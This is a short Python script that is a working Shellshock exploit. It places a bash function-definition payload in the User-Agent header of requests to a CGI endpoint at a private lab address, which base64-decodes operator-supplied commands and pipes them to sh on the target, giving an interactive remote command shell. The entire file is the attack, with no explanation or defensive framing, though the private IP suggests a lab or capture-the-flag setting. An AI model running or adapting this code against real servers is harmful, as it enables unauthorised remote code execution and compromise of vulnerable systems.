#!/usr/bin/python

import requests, sys
from base64 import b64encode

while True:
	command = b64encode(raw_input('send $ ').strip())
	headers = {
		"user-agent":"() { :; }; echo 'content-type: text/html'; echo; export PATH=$PATH:/usr/bin:/bin:/sbin; echo '%s' | base64 -d | sh 2>&1 " % command
	}
	print requests.get('http://192.168.56.101:591/cgi-bin/cat', headers=headers).text.strip()
